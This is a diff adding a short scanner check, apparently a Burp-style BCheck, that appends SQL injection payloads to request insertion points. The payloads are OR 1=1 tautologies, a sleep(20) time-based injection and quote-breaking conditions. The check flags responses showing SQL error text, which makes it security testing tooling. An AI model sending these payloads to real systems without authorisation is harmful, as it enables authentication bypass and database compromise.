@@ -1,0 +1,22 @@
+metadata:
+    language: v1-beta
+    name: "puncher_SQLi_bypass_authentication"
+    description: "puncher_SQLi_bypass_authentication"
+    author: "nu11secur1tuy"
+
+run for each:
+    puncher = "'+OR+1=1--","'+(select*from(select(sleep(20)))a)+'","' or '1'='1","'nu11secur1ty' or 1=1#"
+
+given query or body insertion point then
+    send payload called check:
+        appending: {puncher}
+
+    if {check.response.body} matches "(SQL|Postgresql|Microsoft Sql|sql|postgresql|microsoft SQL)" then
+        report issue:
+            severity: high
+            confidence: firm
+            detail: `There is a change in response when {puncher} is injected.`
+            remediation: "Potential SQLi detected. Please confirm it manually after you check the POST, GET, or other requests... 
+                          The payload from the puncher_SQLi_bypass_authentication module was submitted successfully after the test. 
+                          You must test manually to confirm this vulnerability!"
+    end if
